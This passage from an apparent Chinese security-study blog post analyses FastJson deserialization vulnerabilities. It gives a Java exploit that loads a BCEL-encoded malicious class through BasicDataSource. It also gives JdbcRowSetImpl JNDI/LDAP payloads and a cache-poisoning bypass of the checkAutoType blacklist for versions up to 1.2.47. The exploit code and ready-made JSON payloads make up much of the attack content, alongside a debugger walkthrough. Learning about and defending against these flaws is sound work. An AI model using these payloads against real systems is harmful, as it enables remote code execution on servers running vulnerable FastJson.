+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;  </span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.dbcp.dbcp2.BasicDataSource;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.io.File;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastJsonBcel</span> &#123;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//================最终调用ClassLoader的loadClass方法之前还需满足的两个条件，一个是必须调用Utility.encode进行编码，原因在于它会在流程中调用Utility.decode方法============  </span></span><br><span class="line"><span class="type">byte</span>[] bytes=convert(<span class="string">&quot;H:\\javasecurity\\FastJsonlearn\\target\\classes\\org\\example\\Evilclass.class&quot;</span>);  </span><br><span class="line">String code= Utility.encode(bytes,<span class="literal">true</span>);</span><br><span class="line">String s=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\&quot;driverClassName\&quot;:\&quot;$$BCEL$$&quot;</span> +code+<span class="string">&quot;\&quot;,\&quot;driverClassLoader\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;&#125;&#125;&quot;</span>;  </span><br><span class="line">JSON.parseObject(s);   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] convert(String s) <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line"><span class="comment">//File file=new File(s);  </span></span><br><span class="line"><span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(s));  </span><br><span class="line"><span class="keyword">return</span> code;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>至此FastJson 1.2.24的链子分析差不多了，但是网上的比较常用的TemplentImpl那条链子没有分析，CC链居多，除非题目非要考，很少遇得到，实用性不高，我们接下来分析高版本的绕过</p>
+<h2 id="FastJson高版本绕过"><a href="#FastJson高版本绕过" class="headerlink" title="FastJson高版本绕过"></a>FastJson高版本绕过</h2><p>这里的高版本指 &lt;&#x3D;1.2.47,直到写这篇笔记的时候也只研究到这里，暂待补充</p>
+<h3 id="1-2-25之后的新增waf检测流程分析"><a href="#1-2-25之后的新增waf检测流程分析" class="headerlink" title="1.2.25之后的新增waf检测流程分析"></a>1.2.25之后的新增waf检测流程分析</h3><p>在1.2.25的时候进行了一次修复，主要是存在于parseObject方法的某个逻辑中进行了一次if判断<br>之前在1.2.24的时候就直接 TypeUtils.loadClass初步加载了<br><img src="https://stoocea.github.io/images/FastJson/49.png">)</p>
+<p>我们进checkAutoType方法看看<br>其实刚开始就是两个很重量级的白名单和黑名单，也就是两个for循环执行的内容<br><img src="https://stoocea.github.io/images/FastJson/50.png">)</p>
+<p>其实白名单刚进来的时候是为空的，它是直接向配置文件加载。而黑名单就是写死的，我们之前学的两条链子基本上都不能打了<br>这里就出现了第一次分支<br><strong>&lt;1&gt;.如果在白名单里面，直接加载；如果在黑名单里面，就抛异常结束程序</strong><br>这里我们先打住，记住这次分支。<br>假如说我们指定的加载类即不在黑名单内，也不在白名单内，就下一步</p>
+<p>下一步开始就是寻找指定类了<br>首先会从一个Mapping里面寻找，如果没找到，就又去deserializers解析器里面去找，看之前历史有没有加载过这个类<br><img src="https://stoocea.github.io/images/FastJson/51.png">)</p>
+<p>所以第二次分支是<br><strong>经过这两次if判断，也就是Mapping内存中找，deserializer历史加载缓存中寻找之后如果找到了，直接返回该类，如果没找到进入下一步</strong></p>
+<p>而在下一步之前，又过了一遍白名单和黑名单<br>因为此时autoTypeSupport是始终没有经过我们修改的，所以!autoTypeSupport为true，会进入本次黑白名单检测。<br><img src="https://stoocea.github.io/images/FastJson/52.png">)</p>
+<p>那很明显我们现在想要绕过白名单或者黑名单都是不太可能的。两次黑白名单的内容是不一样的，比如说我这次调试的com.sum包底下的JdbcRowSetImpl类，第一次黑白名单检测的时候就没有被查出来，而第二次就被查出来了<br>再往下走呢其实也不存在正常加载的可能，因为autoTypeSupport始终都是默认false状态，后续的检测基本上都是需要autoTypeSupport为true才能加载</p>
+<p>其实这里的思路就断了，我们重新回到之前第二个分支路口，也就是首先从mapping缓存中找是否有指定类，然后再从deserailizer解析器的解析历史中找是否有加载的缓存的那一部分。</p>
+<h3 id="mapping缓存绕过流程"><a href="#mapping缓存绕过流程" class="headerlink" title="mapping缓存绕过流程"></a>mapping缓存绕过流程</h3><p>首先看看这个mapping缓存能否可控，查看usages<br><img src="https://stoocea.github.io/images/FastJson/53.png"><br>几经寻找我们能够控制类名指定加载的方法<br><img src="https://stoocea.github.io/images/FastJson/54.png"><br>也终于还是fastjson包里面的TypeUtils类种找到了符合条件的地方<br>我们跳到源码处（Type.Utils::loadClass)，只查看关键部分，也就是我们mapping.put的地方<br><img src="https://stoocea.github.io/images/FastJson/55.png">)<br>这里就是加载过后将我们本次加载的类放进mapping的缓存<br>那么接下来就是找哪里调用了这个loadClass了，并且参数可控<br>最为理想的是MiscCodec类中的这个deserialze方法<br><img src="https://stoocea.github.io/images/FastJson/56.png"></p>
+<p>我们跟进到源码，也就是直接调用loadClass的地方<br><img src="https://stoocea.github.io/images/FastJson/57.png"><br>他这里的代码逻辑是说，当我们传进来的类型是Class的时候，就调用loadClass。注意此时loadClass类中有个strval参数，我们跟进到loadClass<br><img src="https://stoocea.github.io/images/FastJson/58.png"><br>会发现strval被指定加载之前，会被直接放进mapping缓存<br>然后我们回到获取反序列化器的ParserConfig类，发现在默认的deserializers键值对中已经存入了Class类型匹配MiscCodec类型的解析器<br><img src="https://stoocea.github.io/images/FastJson/59.png"><br>所以可以触发后续的流程<br>其实到这就差不多了<br>我们可以来捋一捋思路<br>首先肯定要先传入一个Class类型的对象，那么在经过checkAutoType方法的时候就肯定可以返回了Class类了，而不是被waf掉<br><img src="https://stoocea.github.io/images/FastJson/60.png"><br>然后就是获取反序列化器进行反序列化，我们这边看到它的deserializer是MiscCodec<br>然后调用MiscCodec的deserialze方法<br>跟进到如下内容，它会先判断有没有val变量<br><img src="https://stoocea.github.io/images/FastJson/61.png"></p>
+<p>之后就是将我们的val变量中的指定类实例化<br>这个实例化的过程肯定是走到了typeUtils的loadClass方法<br>类加载一遍之后放入缓存 mapping<br><img src="https://stoocea.github.io/images/FastJson/62.png"></p>
+<p>然后呢我们又指定加载一次<br>com.sun.rowset.JdbcRowSetImpl类，并且后续的DataSourceName于autoCommit的值还是照旧，就能够从缓存中直接读到JdbcRowSetImpl的类加载，绕过waf，后面流程就是一样了，三次for循环取setter 静态变量 getter，之后依次调用取得的setter和getter</p>
+<p>所以可以据此得到EXP</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastJsonhighbypass1</span> &#123;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line"><span class="comment">//第一步反序列化一个Class类，值为恶意类 这里还是用JdbcRowSetImpl就行  </span></span><br><span class="line">String s=<span class="string">&quot;&#123;&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap://127.0.0.1:8086/rBJaXBgx\&quot;,\&quot;autoCommit\&quot;:0&#125;&#125;&quot;</span>;  </span><br><span class="line">JSON.parseObject(s);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="FastJson快速复习总结"><a href="#FastJson快速复习总结" class="headerlink" title="FastJson快速复习总结"></a>FastJson快速复习总结</h2><p>这里我还是推荐徐少的学习路线，或者组长的博客。<br>本人写的文章有很大一部分是自学和快速复习用的，不具备参考价值。<br>其实FastJson反序列化漏洞的本质就是代码执行，只不过原生的反序列化调用的是readObject，它调用的是setter和getter，所以跟原生的反序列化的思路是差不多的，但是FastJson的实现payload比较简单，自己构造就行，原生的话就比较麻烦</p>
+<h3 id="FastJson1-2-24流程"><a href="#FastJson1-2-24流程" class="headerlink" title="FastJson1.2.24流程"></a>FastJson1.2.24流程</h3><p>总共两条链子，一条是Bcel链，一条是JdbcRowSetImpl链，我们逐一分析</p>
+<h4 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h4><p>最常用的一条链子，基本流程如下<br><code>JdbcRowSetImpl::setAutoCommit()-&gt;setJdbcRowSetImpl::lookup()</code><br>JSONpayload如下</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap://127.0.0.1:8085/IxylWkcU\&quot;,\&quot;autoCommit\&quot;:0&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+<p>DataSourceName是最后lookup(this.getDataSourceName())lookup参数可控的设置<br>然后autocommit其实传什么都可以，只要是bool类型即可<br>然后这里其实最终用到的还是JNDI的东西，所以RMI ldap都要注意JDK版本<br>注意条件！！：<br>必须出网，且FastJson在1.2.24及以下</p>
+<h4 id="Bcel"><a href="#Bcel" class="headerlink" title="Bcel"></a>Bcel</h4><p>这个是解决无法出网问题（JdbcRowSetImpl）而产生的链子<br>说是Bcel 其实是Bcel包下的一个类ClassLoader，经由它来进行字节码加载类，然后为了这个功能往前找链子</p>
+<p>基本流程如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BasicDataSource::getConnection()-BasicDataSource::createDataSource()-&gt;BasicDataSource::createConnectionFactory()-&gt;(com.sun.org.apache.bcel)ClassLoader::loadclass()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>其实这条链子并没有多少自己探寻的路程，毕竟loadclass往前找到createConnectionFactory还能有信心往前找到setter或者getter就已经很亏则了</p>
+<p>JSON格式payload如下</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\&quot;driverClassName\&quot;:\&quot;$$BCEL$$&quot;</span> +code+<span class="string">&quot;\&quot;,\&quot;driverClassLoader\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;&#125;&#125;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>反序列化的类就是BasicDataSource嘛，然后由于FastJson对于getter方法以及setter方法的获取只要符合条件，在第一次获取构造器的末尾的三段for循环都会给获取到，之后就是会将setter调用以及在JSON.toJSON中将getter调用，getConnection符合条件所以会被获取，自然也会被调用，触发链子</p>
+<h3 id="FastJson"><a href="#FastJson" class="headerlink" title="FastJson&lt;&#x3D;1.2.47高版本绕过"></a>FastJson&lt;&#x3D;1.2.47高版本绕过</h3><p>高版本要绕过的只有一处地方，就是checkAutoType方法会设置白名单和黑名单，我们需要事先将我们需要反序列化的恶意类存入它的白名单才能让后续的恶意类成功加载<br>这个怎么实现呢？<br>当我们传入Class对象的时候，他会调用MiscCodec解析器进行解析，而MiscCodec的deserailze方法会调用指定对象的loadclass，那我们可以传入Bcel包下的loadclass以及恶意类作为目标，成功加载一遍，实现存入mapping缓存，然后再进行一次恶意类的解析，就能够绕过检测了</p>
+<p>JSON格式payload如下</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&#123;&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap://127.0.0.1:8086/RibRzWTk\&quot;,\&quot;autoCommit\&quot;:0&#125;&#125;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>val是MiscCodec中loadclass需要的对象<br>然后第二次JSON数据就是跟低版本的payload一样了</p>
+
+        
+      </div>
+
+         
+    </div>
+    
+     
+  </div>
+  
+    
+<nav id="article-nav">
+  <a class="article-nav-btn left  disabled "
+     >
+    <i class="fa-solid fa-angle-left"></i>
+    <p class="title-text">
+        
+    </p>
+  </a>
+  <a class="article-nav-btn right "
+    
+      href="/2023/11/02/JNDI%E6%B3%A8%E5%85%A5/"
+      title="JNDI初步学习"
+     >
+
+    <p class="title-text">
+      
+        JNDI初步学习
+        
+    </p>
+    <i class="fa-solid fa-angle-right"></i>
+  </a>
+</nav>
+
+
+  
+</article>
+
+ 
+    </div>
+    <div id="footer-wrapper">
+      <footer id="footer">
+  
+  <div id="footer-info" class="inner">
+    
+    &copy; 2023 Stoocea<br>
+    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
+  </div>
+</footer>
+
+    </div>
+    <div class="back-to-top-wrapper">
+    <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
+        <i class="fa-solid fa-angle-up"></i>
+    </button>
+</div>
+
+<script>
+    function topFunction() {
+        window.scroll({ top: 0, behavior: 'smooth' });
+    }
+    let btn = document.getElementById('back-to-top-btn');
+    function scrollFunction() {
+        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
+            btn.classList.remove('hide')
+        } else {
+            btn.classList.add('hide')
+        }
+    }
+    window.onscroll = function() {
+        scrollFunction();
+    }
+</script>
+
+  </div>
+  <script src="/js/light-dark-switch.js"></script>
+</body>
+</html>
